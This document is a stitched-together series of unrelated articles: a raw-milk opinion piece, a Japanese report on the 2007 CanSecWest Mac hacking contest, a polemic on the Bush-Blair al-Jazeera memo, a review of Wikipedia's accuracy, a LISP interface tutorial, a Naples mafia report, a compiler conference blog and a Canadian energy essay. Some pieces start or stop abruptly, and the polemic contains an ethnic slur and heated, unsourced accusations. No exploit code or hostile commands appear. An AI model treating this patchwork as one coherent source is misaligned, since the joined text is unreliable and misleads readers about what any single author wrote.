Drink raw milk , they say , and your arthritis pain will cease , your asthma will go away and you 'll lose weight .
Give it to young children and they will be less likely to get sick and suffer from allergies .
Are all such claims true ?
Who knows .
But one thing is true : Selling raw milk should not be illegal .
" There are 65,000 child - porn websites , " Nancy Sanders , a raw milk supporter , mother and pediatric nurse told Time .
" Why does n't the government go after those ? "
With dangerous criminals like dairy farmer Richard Hebron on the loose peddling such dangerous stuff , those state governments do n't have time .
カナダのバンクーバーで開催されたセキュリティ・コンファレンス「CanSecWest Vancouver 2007 」（4月18～20日）で初めて実施されたハッキング・コンテストでは、「Mac」への侵入を果たしたハッカーが1万ドルの賞金を獲得した。
このハッカーは 、Apple のWebブラウザ 「 Safari」に存在するセキュリティ・ホールをターゲットにしてコンテストに優勝したという。CanSecWestの運営者の1人であるショーン・コモ氏は、「現時点で流通しているOS Xはすべて、このセキュリティ・ホールによって脆弱になっている」と指摘する。
コンファレンス運営者らは、Macにもセキュリティ上の欠陥があることを広く知らしめるために今回のコンテストを開催することにしたとしている。
CanSecWestをはじめ複数のセキュリティ関連コンファレンスで運営主任者を務めてきたドラゴス・ルイウ氏は、「OS Xを使用しているユーザーで、Macの安全性を口にする人は非常に多いが、実際のところ、AppleよりMicrosoftのほうがセキュリティ向上に力を入れている」と述べた。
コンテスト参加者は当初、無線アクセス・ポイントを経由して、何のプログラムも動作していない2台のMacに接続するよう求められていた。だがこれに成功した者が1人も出なかったため、コンファレンス運営者らは、参加者が電子メールでURLを送信することで、Webブラウザ経由で当該のMacにアクセスすることを許可した。
この条件下でセキュリティ・ホールをつくURLを送ってきたのが、米国ニューヨーク州に住むディノ・ディ・ゾフィー氏だった。コンテストに参加できるのは今回のCanSecWestの出席者だけであったため、ディ・ゾフィー氏はコンファレンス会場にいた友人にURLを送信し、これをコンテスト運営者に転送してもらった。
同 URLにアクセスすると空白のページが開くが、実はこれがSafariの入力処理に関する脆弱性につけ込む動作であったと、コモ氏は説明する。同脆弱性を悪用する方法は数多く考えられるが、ディ・ゾフィー氏はこれを用いてバックドアを仕掛け、そこからMac上のあらゆるコンポーネントにアクセスできるようにしたという。
問題の脆弱性の詳細は公表されていない。Appleに対する結果報告は、賞金を用意したスリーコムのティッピングポイント部門が責任を持って行うとしている。
もともとはコンテストで使われたMacの1台が賞品とされていたのだが、ティッピングポイントは4月19日夜に急遽賞金を出すことを決め、これによってコンテストへの関心がにわかに高まった。
ティッピングポイントのセキュリティ・レスポンス担当マネジャー、テリー・フォースロフ氏は、Macがハッカーの標的になりにくかった理由について、そもそも攻撃対象となるMac自体が少なかったからだと分析している。「要は見返りの問題だ。MacはWindowsなどのプラットフォームほどには普及していない」（同氏）。
今回の場合、賞金が魅力的な見返りになったわけだ。
以前から自分の侵入テクニックに自信を持っていたハッカーにとって、今回のコンテストは腕の見せ所だったようだ。「これまでも、Macに侵入するのがいかに容易であるかを指摘する人と何度も出会ったことがある」（ルイウ氏）
一部のコンファレンス参加者 は 、Appleが19日の晩にOS Xの脆弱性25件を修復するパッチをリリースしたのは、決して偶然ではないと見ている。
Windowsマシンには、ハッキングや不正コードの格好のターゲットにされてきたという経緯があるが、Macはそこまでの被害は受けてこなかった。これは、利用数が絶対的に少ないMacを不正コードの標的にしても、広く使われているPCと同等の影響を及ぼすことができないためだ。
「 OpenBSD 」プロジェクトのリーダーであり、先のコンファレンスにも出席したテオ・デ・ラート氏は、「脆弱性の暴露に際してきわめて強硬な法的措置を取る」Appleの体質についても言及した。
「 ハッカ ー がAppleから受け取った脅迫まがいの書簡を公開し始めれば、同社こそが“悪者”であるように見えてしまい、痛手を被ることになるだろう」と同氏は懸念を示している。

These are days of troubled sleep .
As in a dream , you walk familiar streets , living out your ordinary life – going to work , having love affairs , watching sports , getting the car fixed , worrying about bills , fighting a toothache , taking kids to school , listening to music – and everything seems as it was before , as it always was ; you seem to be what you always were : a free person in a free country .
Then some discordant noise reaches your mind ; you stir , you open your eyes , and you remember : that 's not how it is here anymore .
For citizens in the world 's two " leading democracies , " the United States and Britain , these rude awakenings come at regular intervals now , piercing through the incessant roar of static from the media engines of sell and spin .
A story catches your eye – usually something buried beneath the " big news " of the day – and once again you 're tumbled from your private concerns into a dreadful realization of where history has taken you : into a strange hybrid world of unfree freedom , where you can say what you want , do what you want – unless those in power arbitrarily decide that you can't .
In 99 cases out of 100 , they 'll leave you alone ( as long as you 're white and look non-threatening ; if not , that ratio drops considerably ) .
But this liberty is illusory ; it no longer has a physical reality , or even a statutory one .
It is now a " gift " of the authorities , one which they can bestow – or revoke – according to their own , ever - shifting needs and desires .
The idea of arbitrary power beyond all check of law or outside supervision is the sum total of the so - called " Unitary Executive " theory of the Bush Administration , which has put this radical and barbaric idea into practice .
It is also undergirds the " crown prerogative " of British governance , where the ancient immunities of the sovereign ( " The king can do no wrong " – or as that proto-unitary executive Richard Nixon once put it : " If the president does it , it 's not illegal " ) have " devolved " upon the prime minister as head of the government .
In neither of these endlessly self - celebrating democracies is the consent of the governed or the rule of law the basis for the exercise of power .
Otherwise , the leaders of these countries – the dual lame ducks Bush and Blair – could not have launched an illegal war or maintained this criminal enterprise year after blood - soaked year .
And many of their exercises of arbitrary power have been in aid of masking the true nature of this war .
Thus we come to the latest shaking of our troubled sleep .
While the media world gaped and gabbed about Tony Blair 's long - belated announcement of his long - overdue retirement yesterday , a more revealing story was buried beneath the fold or in the back pages – except in the dogged Independent , which put it on the front page :
Two jailed for trying to leak details of Blair 's talks with Bush
Tony Blair 's ill - fated war with Iraq claimed two more victims yesterday when a civil servant and an MP 's researcher were convicted of disclosing details of a secret conversation between the Prime Minister and President George Bush .
Last night , MPs , lawyers and civil rights groups described the prosecution as a " farce " and accused the Government of misusing the Official Secrets
Act to cover up political embarrassment over the war .
David Keogh , 50 , a Cabinet Office communications officer , was today jailed for six months .
He passed on an " extremely sensitive memo " to Leo O'Connor , 44 , a political researcher who worked for an anti-war Labour MP , Anthony Clarke .
O'Connor was today sentenced to three months in jail after an Old Bailey jury found them guilty yesterday of breaching Britain 's secrecy laws .
Their trial was carried out under extraordinary secrecy , clamped down even tighter than Britain 's continuing series of terror plot trials .
The judge would n't even allow the press to report Keogh 's response " when he was asked in open court what preyed on his mind when he first saw the document , " the Guardian reports .
What 's more , the British press were also forbidden from referring to stories they had previously published about the memo when it first came to light and reports of its contents were being freely discussed .
The attorney general – Blair 's old friend Peter Goldsmith , the same legal eagle who infamously reversed his stand on the illegality of the Iraq invasion after a talking to from the Beltway boys , and who most recently quashed a years - long probe into a sex - car - cash bribery scheme between the Saudi royals and the UK 's top arms merchant – draped a retroactive veil of secrecy over the case – much like the one the Bush gang has used on fired FBI truth - teller Sibel Edmonds after she threatened to expose a nest of high - level treason and corruption .
The only thing the British press could tell the British people about the trial yesterday – beyond the sentences handed down – was the reaction Keogh had given to the police when he was first arrested in 2005 .
He told them that what he had seen in the memo convinced him that " Bush was a madman . "
But what was this document whose very existence posed such a dire threat to the life of the nation that its contents could not even be hinted at in public ?
It was a four - page record of a White House meeting between George W. Bush and Tony Blair on April 16 , 2004 .
It is known in the trade as the " al - Jazeera Bombing Memo " because in those early news reports – after Keogh had leaked the document in May 2004 to O'Connor , in the hopes that it would be brought before the people 's representatives in Parliament – at least one part of its contents became widely known ; to wit , that Bush had proposed to Blair that they bomb the headquarters of the independent Arabic news agency al - Jazeera in Qatar , as well as agency offices elsewhere .
The context of this criminal proposal is important .
In April 2004 , the grand Babylonian Conquest was turning into a nightmare .
The tortures at Abu Ghraib had just been exposed .
( Outrages which , as we now know , were just the barest tip of a massive iceberg : the vast gulag of secret prisons , " disappeared " captives , and " strenuous interrogation techniques " specifically approved by Bush and Rumsfeld . )
But beyond that scandal – which was being successfully fobbed off with the " bad apple " defense , and would never be in an issue in the coming presidential election – there was also , more glaringly , the ongoing bloodfest in Fallujah : the Guernica of the Iraq War .
The attack was launched in retaliation for the killing of four American mercenaries from the politically - wired firm of Blackwater on March 31 , 2004 – another PR hit for the " Mission Accomplished " team in the White House .
Fallujah – a once quiet city whose citizens had rebelled against Saddam Hussein – had been turned into a hotbed of unrest over the course of the previous year by a heavy - handed American occupation , which included several civilian deaths after occupation troops fired into crowds exercising what they believed was their liberated right to protest .
Anger and insurgency took hold in the city , leading to the " Black Hawk Down " style despoliation of the dead mercenaries a year later .
Against the advice of military commanders on the scene , Bush ordered the " pacification " of the city a few days later .
But the L'il Commander 's attack turned into yet another PR nightmare , spreading death and destruction through civilian areas , causing hundreds of deaths , launching airstrikes into residential areas , closing the city 's main hospitals while thousands were suffering – and failing to dislodge the insurgents who were the ostensible target of the operation .
( There were two other main targets , of course : the American people , who were meant to be seduced by the man-musk of the War Leader , and the Iraqi people , who were meant to be terrorized into submission by the shock - and - awe of Fallujah 's decimation . )
In addition to the lack of progress on the battleground , Bush was beset by the presence of al - Jazeera correspondents in the city .
The agency – headquartered in Qatar , a staunch U.S. ally – was a rare independent voice in the Arab world , reporting from all sides and offering a platform for all sides , including Israeli and American officials .
It was , in fact , the very kind of thing that Bush claimed he wanted to instill in the Middle East through his invasion of Iraq .
But of course , this was just another lie .
Al - Jazeera 's independence proved inconvenient for the Bushists , who in both Iraq and Afghanistan had sought to impose the greatest degree of message control ( and " psy- ops " spin ) ever seen in an American war .
For both the Bushists and the Blairites , truth was not the first casualty of war ; it was a deadly enemy – an enemy combatant , in fact , to be rendered , disappeared , tortured , killed , like any other gulag captive .
So it was no surprise at all that Bush and Blair would be discussing al - Jazeera during that fretful confab in April 2004 .
Nor is it any surprise that Bush 's answer to the " problem " of an independent Arab news agency would be to kill the ragheads where they stand .
He had already demonstrated that wanton violence and mass murder was his preferred option for dealing with problems in the Middle East .
The contents of the controversial memo were actually well - known after it came to light – and before Blair 's buddy Goldsmith lowered the boom .
The Daily Mirror , for example , had this report in November 2005 : President Bush planned to bomb Arab TV station al - Jazeera in friendly Qatar , a " Top Secret " No 10 memo reveals .
But he was talked out of it at a White House summit by Tony Blair , who said it would provoke a worldwide backlash ...
The attack would have led to a massacre of innocents on the territory of a key ally , enraged the Middle East and almost certainly have sparked bloody retaliation .
A source said last night : " The memo is explosive and hugely damaging to Bush .
He made clear he wanted to bomb al - Jazeera in Qatar and elsewhere .
Blair replied that would cause a big problem .
There 's no doubt what Bush wanted to do – and no doubt Blair did n't want him to do it . "
A Government official suggested that the Bush threat had been " humorous , not serious " .
But another source declared : " Bush was deadly serious , as was Blair .
That much is absolutely clear from the language used by both men . "
Al - Jazeera 's HQ is in the business district of Qatar 's capital , Doha .
Its single - storey buildings would have made an easy target for bombers .
As it is sited away from residential areas , and more than 10 miles from the US 's desert base in Qatar , there would have been no danger of " collateral damage " .
Dozens of al - Jazeera staff at the HQ are not , as many believe , Islamic fanatics .
Instead , most are respected and highly trained technicians and journalists .
To have wiped them out would have been equivalent to bombing the BBC in London and the most spectacular foreign policy disaster since the Iraq War itself .
The No 10 memo now raises fresh doubts over US claims that previous attacks against al - Jazeera staff were military errors .
In 2001 the station 's Kabul office was knocked out by two " smart " bombs .
In 2003 , al - Jazeera reporter Tareq Ayyoub was killed in a US missile strike on the station 's Baghdad centre .
The memo , which also included details of troop deployments , turned up in May last year at the Northampton constituency office of then Labour MP Tony Clarke .
This is the kind of thing that filled British papers for weeks .
But now , in the brave new world of unfree freedom that Bush and Blair have bestowed upon their subjects , Britons can no longer mention any of this in public .
Indeed , the judge in the Keogh case reinforced Goldsmith 's earlier ban with a new gag order , decreeing " that allegations already in the public domain could not be repeated if there was any suggestion they related to the contents of the document , " the Guardian reports .
Anyone who does so can be jailed for contempt .
Yes , jailed for repeating in public what has already been published .
During the trial , Blair 's top foreign policy wonk , Sir Nigel Sheinwald , offered this notable justification for jailing faithful government servants whose consciences had been shocked into action by the discovery of a plot for mass murder by the " leader of the free world " :
In evidence at the trial , Sir Nigel Sheinwald ... said private talks between world leaders must remain confidential however illegal or morally abhorrent aspects of their discussions might be .
Quite right , too .
After all , if a memo of , say , a summit meeting between Hitler and Mussolini had come to light in , say , 1938 , detailing how Hitler had told Mussolini that he was going to , say , kill a few million Jews just as soon as he could lay his hands on them , then obviously such confidences between statesmen should be respected – and any civil servant who tried to warn the world about this " madman " should obviously be prosecuted .
Blair – who in his lachrymose and self - pitying resignation speech yesterday again reiterated his pride in standing " shoulder - to - shoulder " with Bush in the slaughter of more than 600,000 innocent human beings in Iraq – obviously talked his pal down from his murderous rage at al - Jazeera , which is now so respectable that it appears on American cable TV systems .
But there was no such consideration for the people of Fallujah .
Bush soon called off the attack as the bad PR mounted , but promised that the city would be " pacified " in the end – after the election .
And so it was , without demur from Blair .
Just days after Bush had procured office again in November 2004 , a second assault – even more savage than the first , was launched , destroying the city with bombs , shells and chemical fire .
It is entirely typical of our strange days that the arbitrary , draconian power that now characterizes the Anglo - American " democracies " would be used here in an attempt to suppress a political embarrassment – the revelation of a barbaric idea that never came to fruition – while the actual physical slaughter of hundreds of thousands of people is openly and unashamedly embraced – even championed as an act of moral courage , as in Blair 's unctuous parting bromide , " Hand on my heart , I did what I thought was right . "
So did Pol Pot .
So did Stalin .
So did Osama bin Laden .
So does every madman who vaunts himself beyond the law , and kills in the name of a " higher cause . "

Wikipedia , the people ’s encyclopedia , is a multilingual , million - entry fount of knowledge from Britney to Byzantium that has lately become the elitists ’ favorite whipping boy .
Unreliable , they say .
Easily tampered with .
Incoherent .
Out of control .
A demolition derby of ideologies , driven by reckless amateurs and cybergeeks with too much time on their hands .
And yet , when people take time to read the Wikipedia entries on subjects where they have some experience or expertise , they are often pleasantly surprised .
I have found Wikipedia to be a tremendous resource , whether I need a quick primer on the history of the Caliphate , or the name of that dog that used to star in “ Frasier . ”
Wikipedia ’s unpaid contributors are rapidly compiling one of the best movie databases ever , with extensive plot and character summaries of all major films , and tremendously useful linked - lists of subjects like “ Best Picture Winners . ”
To try a more objective test than my own need to find Martin Scorsese ’s birthdate , The Denver Post asked five Colorado scholars to review the Wikipedia entries on Islam , Bill Clinton , global warming , China and evolution .
The results ?
Four out of five agreed their relevant Wikipedia entries are accurate , informative , comprehensive and a great resource for students or the merely curious .
The fifth scholar called his chosen entry “ not very good , ” found some details to be inaccurate by omission , and said similar entries in more accepted encyclopedias like Encarta do their job better .
Favored source
The scholarly endorsements are encouraging , and increasingly important as Wikipedia becomes a favored international source not just of historical information , but daily events .
In the two days after the Virginia Tech shootings , Wikipedia ’s compilation of news accounts on that topic saw 750,000 page views .
More than 2,000 volunteer editors contributed to rapid updates , according to a New York Times column on the phenomena .
Wikipedia has more than 1.6 million entries in English alone ; it ’s the most popular education and research site on the Internet , by far .
On any given day , 8 percent of Americans online use the site , according to the Pew Internet & American Life surveys .
So now , to our scholarly panel .
On the much - debated topic of global warming , Colorado State University ’s Scott Denning called the Wikipedia entry “ a great primer on the subject , suitable for just the kinds of use one might put to a traditional encyclopedia .
Following the links takes the interested reader into greater and greater depth , probably further than any traditional encyclopedia I ’ve seen , ” said Denning , the Monfort Professor of Atmospheric Science .
Denning said he was pleasantly surprised how the main articles “ stick to the science and avoid confusing the reader with political controversy . ”
Students who want to study up on the controversy , however , find plenty of links if they want them .
Denning wishes Wikipedia offered better links to basic weather science .
“ Apparently there is still a role for real textbooks and professors ! ” he said .
University of Colorado history professor William Wei was the most negative voice in the bunch , calling the basic entry on China “ simplistic , and in some places , even incoherent . ”
Wei said the Wikipedia entry mishandled the issue of Korean independence from China , for example , and the context of the Silk Road in China ’s international relations .
“ One of its problems is relying on amateurs to contribute , ” said Wei , who admits he brings a rigorous perspective to the material as a specialist in Chinese Republican history .
“ I applaud a democratizing spirit , but quite frankly it can lead to , for want of a better word , mediocrity . ”
Clinton : thorough , unbiased
Bob Loevy , a political science professor at Colorado College and frequent writer on Bill Clinton , said the President Clinton entry was thorough and unbiased , giving fair weight to both Clinton accomplishments and scandals .
The bulk of it appeared to have been written by the Clinton Museum and Library in Little Rock , Ark. , Loevy said .
“ It would have been a great place for a student to begin building his or her knowledge ” on Clinton , Loevy said .
As did the other professors , Loevy said he cautions his students to treat Wikipedia like any other single book in the library – any fact cited there should be double - checked somewhere else .
If any world subject is ripe for tampering or acrimony , it would seem to be the Wikipedia on Islam .
Yet retired CU religious studies professor Frederick Denny , a 40 - year specialist in Islam , was “ quite impressed ” with Wikipedia ’s 28 - page entry .
“ It looks like something that might have been done by a young graduate student , or assistant professor , or two or three , ” Denny said .
He described the writing as clinical and straightforward , but not boring .
Where important translations of Arabic language or fine religious distinctions are required , Wikipedia acquits itself well .
“ I have a feeling there are very responsible people out there who are making sure this does n’t become ” a free - for - all , Denny said .
Finally , on the Wikipedia topic of evolution , CU biology professor Jeffrey Mitton declared the entry “ good , ” even if “ stylistic infelicities abound . ”
If a student read through the main entry and the primary links to supporting concepts , he would get a fine introduction , Mitton said .
Always the careful scholar , Mitton scrolled to the bottom of the evolution entry to the bibliography .
The first reference cited was for the authoritative textbook on evolution by Douglas Futuyma , “ so that is excellent , as it should be , ” Mitton observed .
The rest of the source list was appropriate , and well - rounded , he added .
“ Years ago , I never thought you ’d be able to use a computer to find information so easily , ” said Mitton , who consults Wikipedia among other sources when he writes a newspaper column on plant species .
“ It has changed the nature of studying . ”

THE drive for “ green energy ” in the developed world is having the perverse effect of encouraging the destruction of tropical rainforests .
From the orang - utan reserves of Borneo to the Brazilian Amazon , virgin forest is being razed to grow palm oil and soybeans to fuel cars and power stations in Europe and North America .
And surging prices are likely to accelerate the destruction
The rush to make energy from vegetable oils is being driven in part by European Union laws requiring conventional fuels to be blended with biofuels , and by subsidies equivalent to 20 pence a litre .

A user interface is an unusual sort of program because its success depends on emotional appeal .
Emotional appeal does n't ordinarily enter into our judgments of software .
We judge a compiler according to more objective considerations , such as its speed and robustness and the speed and robustness of the code it generates .
With interfaces , the rules are different .
The user interface is often the least sophisticated element of a program but the one users most care about .
For the programmer , this means a relatively small amount of effort can make a program more appealing .
The biggest payoff , as software developers are discovering , is in graphics .
A graphic interface by - passes the verbal and appeals directly to the visual .
And anyone who has seen a video game knows how much more quickly visual information is assimilated .
Who could play a real - time video game in which the state of the game was displayed as a screen of text ?
This article discusses how to write graphic interfaces for LISP programs .
It includes most of the code necessary to attach graphic objects -- dynamically updated graphic representations -- to LISP data structures .
The code can be used to make a wide variety of programs more appealing to the front end of nearly any LISP program in a matter of hours .
This code runs under Common LISP with a very simple window system .
If your LISP does n't support windows , the code will work if you simply eliminate all references to them .
It could easily be adapted to run under some other other lexically scoped LISP ( such as Scheme ) , but it depends too heavily on lexical scoping to run under dynamically scoped dialects .
The Aim
This article will discuss graphic interfaces with an object - oriented flavor .
To say that the things we 're going to make will be objects is to say that :
Each will be a discrete collection of LISP functions ( or " methods " ) that entirely defines its behavior .
Each will be an instantiation of some archetypical object .
Each will act of its own accord ; after we 've defined an object , we wo n't have to think about it again ; each object will update itself and , if necessary , any other objects , dynamically .
A concrete example will make all this clearer .
Using the code given here , we will be able to define a type of graphic object called a " dial " .
We will then be able to make instances of dials as we need them , attaching them to LISP objects simply by saying attach , dial , and where we want the dial " attached :
Once we have attached a dial to something , the dial will henceforth display its value .
As the value stored in the LISP object changes , the needle of the dial will move automatically .

BBC News , Naples , Italy
Naples has seen seven gang deaths in five days
The two victims , men in their thirties , were trying to escape their killer on a motorcycle .
One of them was shot several times in the back of the head .
The other , pinned to the ground underneath his fallen bike , was executed as he lay begging for help .
It was a brazen gangland killing - it happened in broad daylight , in the rush hour , and outside the offices of the financial police .
Battle for control
Over the past few weeks the suburbs of Naples have turned into a battle zone , as rival clans within the Mafia , known as the Camorra , battle for control of the drug trade .
There have been seven deaths in five days .
These latest two murders were retribution , say police , for the killing of a rival gang member several days earlier .
The escalation of violence has led to calls for the army to be deployed on the streets .
Hiding your face in this part of the city could set you apart as a member of a rival gang and that can be fatal
Naples police officer
" Before this was a taboo , " said Justice Minister Clemente Mastella .
" Now I am open to discussing it .
The army is an option we should consider . "
But police and magistrates in the city agree that the army is not the answer .
" What we need is a justice system that works , " said Franco Roberti , head of the regional anti-Mafia department .
" Criminals need to know they risk serving real time .
We need more resources and more police on the streets . "
Interior Minister Giuliano Amato has promised an extra 1,000 policemen .
But what difference can they really make ?
Gang feud
Privately magistrates blame the government .
In August , 8,000 inmates were granted early release , to ease the pressure on the overcrowded prisons .
They are men now free to settle old scores .
The main feud is between gang members in the suburbs of Scampia and Secondigliano .
There is a new generation of ambitious young gangsters who want a larger cut of the drugs profits .
Strangers are largely unwelcome in these districts .
When we arrived in the suburb of Sanita , under police escort , young men who serve as Camorra lookouts appeared on the balconies .
" In these streets you will notice the men who ride motorbikes never wear a helmet , " said the officer with us .
" They make sure the bosses know who they are .
Hiding your face in this part of the city could set you apart as a member of a rival gang .
And that can be fatal . "
' Taking its toll '
Not all the violence though can be blamed on the Mafia .
Low - level crime is endemic .
A good number of the deaths are the result of muggings and armed robberies .
The authorities have pleaded for a long - term commitment to cut crime
In May last year , the president of the Italian Olympic Committee , Ernesto Albanese , lost his father in a street robbery .
He was killed at the entrance to his home by bandits who still remain at large .
Today Ernesto runs a project called " L'Altra Napoli " ( The Other Naples ) , which seeks to encourage wealthy Neapolitans to return and help their city .
" There have been 130,000 crimes in the last year - five times the national average .
The incredible thing is that an estimated 40 % of the crimes are never reported .
So probably the real figure is much higher , " he said .
" That takes an enormous toll on the city . "
" Look at Neapolitan people , look how they have changed .
Once they were open , smiling , they were happy - now if you look at the people 's faces they are sad , they are frightened and you can understand why . "
The escalation of violence has undermined years spent trying to put a kinder , gentler face on Naples .
Successive governments have cleaned up the piazzas , reopened the museums .
But of late the tourists who come have been caught in the crossfire .
A Canadian was hit by a stray bullet last month while walking in the centre of the city .
In August an American was beaten up as he gave chase to two muggers .
People are hoping that with time , economic development will eliminate the Mafia .
But the problems run deep .
When a Mafia war starts it is hard to stop .
The killing will continue , one officer told me , until one clan has eliminated the other .

Today was a bonding day for those of us that attended the Compiler Lab , after the morning session and the lightning talks were over most of us stayed around and talk until the end of the day .
In the afternoon , while some of us were busy schmoozing and debating important topics like what was better : Jon Stewart or the Colbert report and lamenting the results of the French elections some other people were actually busy hacking in the afternoon .
Apparently some folks that are working on a ColdFussion compiler got their Cold Fusion compiler using the DLR .
Rodrigo and JB were also quite busy hacking in the afternoon .
Good news for Boo users : after I posted my message yesterday about readline - like functionality Cédric Vivier pointed out that he had just implemented the readline capabilities in Booish .
You can see the details here .
Hosting and the Case for Multiple Hosts
The morning sessions focused on how to host DLR - bound languages into an application and the various services offered by the DLR infrastructure .
A question that came up is whether it is necessary to support more than one hosting " context " in a single application .
Where global variables and types would be shared across multiple scripting instances .
Although today the DLR does not support more than one context , I believe that it should support independent contexts .
A case was made for Processes and AppDomains already existing and that adding a scripting contexts was not necessary but if there were interesting scenarios for this setup they could look into it .
In my opinion , AppDomains are too heavy of a separation barrier in an application .
They are hard to setup properly and depending on them requires an entire application to be restructured around this new boundary .
In the particular case of Boo , multiple hosting environments can exist in a single application and I think this is a good thing .
The best use can I can think of for the need to have multiple hosting contexts would be if the DLR is hosted in two independent libraries A and B developed by two independent groups and then having both of those libraries consumed by a third party .
The developers of A and B should not have to talk to each other .
Another example : I could imagine a setup where I want a scripting context for extending the internals of my application and on the same process , I would like to have a second scripting context that does not have access to the internals of my application , but instead is used by the user to write / prototype whatever it is that my application hosts .
An accounting application that is heavily scripted internally would use one hosting context for its internal scripting facilities : forms , rendering , accounting and another scripting context would be used for doing report scripting : a much more limited environment that would not get access to all the application internals and types and globals , but only those that make sense for the reporting infrastructure .
Anyways my vote : yes , we need multiple hosts per AppDomain .
There was a demo of some scripting editor during the talk that hosted the DLR itself but Google does not turn up anything useful about it ( Nessie ) , it looked cute .
DLR Code Generation Scenarios
In the second part of the sessions they showed some examples of what kind of code IronPython , IronRuby and the Javascript compilers generate .
The DLR in particular provides support for capturing the environment ( to create proper lambda functions ) .
A key point during the presentations was that providing as much information the DLR as possible allowed it to optimize the code .
Rodrigo - the author of Boo- pointed out during one of the breaks that he did like the optimizations that scripting developers were getting for free .
Milo : Compiler Infrastructure
In a similar spirit to what the DLR team did by refactoring IronPython into the DLR and then growing languages out of it , Rodrigo and JB talked about a similar project .
Based on the Boo codebase and their joint work on Cecil while they both worked at db4objects they created Milo ( which is available here : http://code.google.com/p/milo/.
Milo 's goal is to simplify the development of a compiler that targets the .NET framework
Cute Anecdotes
Their new DLR - based Javascript compiler ( that implements the current ECMA spec ) was written by two developers in four months .
Nandan Prabhu was at the conference and he explained that if they were to rewrite it today it would probably take three months for a programmer to implement as such a person would not have to keep up with the daily changes in the DLR .
The current sizes for the runtime and the compiler are :
-rw -r--r-- 1 root root 114688 2007-05-02 04:07 Microsoft.JScript.Compiler.dll -rw-r--r-- 1 root root 299008 2007-05-02 04:07 Microsoft.JScript.Runtime.dll
Extrapolating that from our compiler source code it seems that the code is roughly 35,000 lines of code for both the compiler and the runtime .
And the compiler is only one fourth of that , so something in the 9,000 line range .
Another interesting detail : the new Javascript compiler is written in Visual Basic .
NET .
Dinner
The day ended up with a fascinating discussion in the kitchen with the Jims ( Miller and Hugunin ) about languages , big integer support , scheme , python , academia and practice and tons of anecdotes of the early days of the CLR and Jim 's days at MIT .
Last week , we learned that Canada ’s record on greenhouse gas emissions reductions is the worst of the G8 .
Worse even than the non-signatory to the Kyoto Accord , the United States .
This sets a realistic counterpoint to the much hyped greenwash announcements of the Canadian federal government in previous weeks .
The Eco-Energy public relations events were primarily recycled hot air from the previous administration ; wrapped in Tory blue paper and tied up with green ribbon .
The appearance of action while committing to nothing was assailed by political partisans and pundits , but with no effective or constructive criticism .
It was a clear victory of symbolism over substance .
If the subject were less serious , these recent Eco-Energy announcements would be amusing for their creative contortions of meaning and underlying irony .
Given the fundamental subject is actually the survival of a significant portion of the planet ’s human population ( and by implication , a number of other species ) , the humour fades quickly .
While the average Canadian appears oblivious to the warning signs , and climate change deniers remain firmly in control of the federal governments in Canada and the U.S. , the reality is becoming increasingly stark for those paying attention .
In summary , world peak oil production ( conventional oil ) is here .
North American peak natural gas production is here .
Mining the Canadian tar sands is a losing proposition , costing more in environmental impacts , natural gas and fresh water than it is worth .
The concept of parking a couple of nuclear reactors in the oil patch to replace the natural gas being used is laughable on multiple levels , not least because we have no plan in place for dealing with the radioactive spent fuel .
Canadians , on the whole , do n’t give a fig for our environment .
We continue to despoil it unabated , assuming that when we make one area uninhabitable , we can simply move on to another .
We pave over our productive farmland in order to build our future ghettoes , currently known as suburbia .
As a species ( homo hydrocarbonus ) , there can be no doubt that we will consume every drop of recoverable fossil oil we can before we are done , and all the natural gas .
We can debate how long that will take , and whether we mitigate the effects to any perceptible extent , but that is petty stuff .
More interesting are the questions of how we will accommodate the climate change refugees , and how much of our current economic and cultural practices we can sustain as oil and natural gas rise in price .
The case of post - Katrina New Orleans is instructive on how we will deal with climate change refugees , as a best case outcome .
There are a small , but well - connected and vocal group who are working toward the creation of the “ hydrogen economy ” as the ubiquitous successor to today ’s hydrocarbon energy paradigm .
In my book , The Emperor ’s New Hydrogen Economy , I argue that this is not going to work for a wide variety of reasons .
( I do n’t propose to repeat those here .
If you are interested , there is a sampling that pre-dates the book available on my web site ) .
The hydrogen economy is currently the most popular of the never - quite - ready “ silver bullet ” solutions being proposed to our energy problems .
Mirages will not solve the problems ; only deflect us from searching for viable solutions .
How do we move forward from this point ?
First , we need to acknowledge and accept some realities .
Fossil fuels are finite , and we are consuming them at an accelerating rate .
The peak production precipice is upon us .
There is little time to start making major adjustments that could avoid or mitigate major economic and societal collapses .
Governments are unlikely to provide constructive leadership on these matters .
The scale is beyond their conception , their track record is not encouraging , and politicians never want to be the bearers of bad news .
The major multi-nationals in the energy sector have no reason to deliver viable alternatives until they have wrung every penny of profit they can from hydrocarbons , without regard to the consequences which they shed onto the residents of planet earth .
The only force that can alter the course is the combined power of the consumers in the industrialized and industrializing world .
The third world does not consumer enough hydrocarbons to be a factor .
The oil companies extract , transport , refine , store and distribute their products because consumers buy them , both directly and indirectly .
If the market stops buying , the producers will stop producing .
There are no silver bullet solutions .
The hydrogen economy is hype .
Finding more hydrocarbon reserves ( e.g. , sub - sea methane clathrates ) will simply result in more greenhouse gas emissions .
Sustainable energy sources ( solar , hydro , wind , tidal , geothermal , biomass , etc ) are real and they work , but they generally cost more than fossil fuels at current prices , and take time to implement , especially on a scale to replace our current use of fossil hydrocarbons .
Intelligent conservation and improved efficiency are the two biggest wins available to us , and the potential is huge , but not enough on their own .
A personal energy plan will permit us to take the initiative to reduce our overall energy use , and related costs .
It will permit us to substitute sustainable energy sources for finite sources .
It will allow us to make the necessary adjustments in a controlled manner that is tailored to our personal circumstances .
Collectively , these personal energy plans in aggregate will permit our communities to adjust to higher fossil energy costs while minimizing disruptions .
The real question is , do we have the foresight , fortitude and personal energy to develop a personal energy plan and follow through on it ?
Based on my personal experience , I think we do , but not if we sit on our hands and wait for someone else to deal with the matter .
I speak to this in the second half of my book , The Emperor ’s New Hydrogen Economy .
There , I present many ideas there on how you can save on your energy bills with zero or minimal financial investment to get you started , and several ways to substitute sustainable energy into your consumption mix .
It ’s time to get past the rhetoric that we ca n’t afford to save the environment .
If we intend to survive as a species , we ca n’t afford to do otherwise .
The good news is that we can do this while improving our own financial situations ( though perhaps not that of Exxon - Mobil ) , and without devastating the economy ( though there will be some changes , as is natural in our economy anyway ) .
There are opportunities , if we are prepared to embrace them .
Many Canadians are still leery of compact fluorescent lights , although they will save the consumer money .
We resist replacing old refrigerators and freezers , even though potential energy savings of 2/3 ’s or more make a compelling investment case .
We can choose more fuel efficient vehicles at replacement time ( although the current hybrids are not no - brainers – it depends on your typical driving missions ) .
Low - tech solar energy collection is essentially unknown in Canada , but cost - effective if properly implemented ( although anachronistic regulations still present some barriers ) .
